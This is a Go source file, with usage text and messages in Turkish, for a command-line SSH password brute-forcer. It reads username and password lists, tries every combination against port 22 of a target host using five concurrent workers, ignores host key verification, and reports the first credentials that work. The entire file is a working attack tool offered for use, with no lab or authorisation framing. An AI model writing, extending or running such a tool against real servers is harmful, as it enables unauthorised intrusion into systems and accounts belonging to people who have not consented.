package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func printUsage() {
	fmt.Println(`
Kullanım: go run ssh.go -h <hedef_host> [-p <şifre> | -P <şifre_listesi>] [-u <kullanıcı_adı> | -U <kullanıcı_adı_listesi>]

Gerekli:
  -h <hedef_host>        Hedef IP veya hostname belirtin.
  -p <şifre>             Tek bir şifre belirtin.
  -P <şifre_listesi>     Şifreleri içeren bir dosya belirtin.
  -u <kullanıcı_adı>     Tek bir kullanıcı adı belirtin.
  -U <kullanıcı_adı_listesi> Kullanıcı adlarını içeren bir dosya belirtin.
	`)
	os.Exit(1)
}

func parseArguments() (string, []string, []string) {
	var target, password, passwordFile, username, usernameFile string

	flag.StringVar(&target, "h", "", "Hedef IP veya hostname")
	flag.StringVar(&password, "p", "", "Tek bir şifre")
	flag.StringVar(&passwordFile, "P", "", "Şifre dosyası")
	flag.StringVar(&username, "u", "", "Tek bir kullanıcı adı")
	flag.StringVar(&usernameFile, "U", "", "Kullanıcı adı dosyası")
	flag.Parse()

	if target == "" {
		fmt.Println("Hata: Hedef host (-h) belirtilmeli.")
		printUsage()
	}

	if password == "" && passwordFile == "" {
		fmt.Println("Hata: Şifre için ya -p ya da -P belirtilmeli.")
		printUsage()
	}

	if username == "" && usernameFile == "" {
		fmt.Println("Hata: Kullanıcı adı için ya -u ya da -U belirtilmeli.")
		printUsage()
	}

	var passwords []string
	if password != "" {
		passwords = []string{password}
	} else {
		passwords = readLines(passwordFile)
	}

	var usernames []string
	if username != "" {
		usernames = []string{username}
	} else {
		usernames = readLines(usernameFile)
	}

	return target, usernames, passwords
}

func readLines(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		fmt.Printf("Hata: Dosya '%s' açılamadı: %s\n", path, err)
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Hata: Dosya '%s' okunurken hata oluştu: %s\n", path, err)
		os.Exit(1)
	}

	return lines
}

func sshLogin(target, username, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	conn, err := ssh.Dial("tcp", target+":22", config)
	if err != nil {
		if err.Error() == "ssh: handshake failed: ssh: unable to authenticate" {
			return false
		}
		fmt.Printf("[Hata] SSH bağlantısı sırasında hata: %s\n", err)
		return false
	}
	defer conn.Close()
	return true
}

func worker(wg *sync.WaitGroup, jobs <-chan [2]string, target string) {
	defer wg.Done()

	for job := range jobs {
		username, password := job[0], job[1]
		fmt.Printf("[DEBUG] %s:%s bilgileri %s üzerinde deneniyor\n", username, password, target)

		if sshLogin(target, username, password) {
			fmt.Printf("[BAŞARILI] %s:%s bilgileri doğru!\n", username, password)
			os.Exit(0)
		}
	}
}

func main() {
	target, usernames, passwords := parseArguments()

	jobs := make(chan [2]string, len(usernames)*len(passwords))

	for _, username := range usernames {
		for _, password := range passwords {
			jobs <- [2]string{username, password}
		}
	}
	close(jobs)

	var wg sync.WaitGroup
	for i := 0; i < 5; i++ { // 5 eşzamanlı iş parçacığı
		wg.Add(1)
		go worker(&wg, jobs, target)
	}

	wg.Wait()
	fmt.Println("[Tamamlandı] Tüm kombinasyonlar denendi.")
}
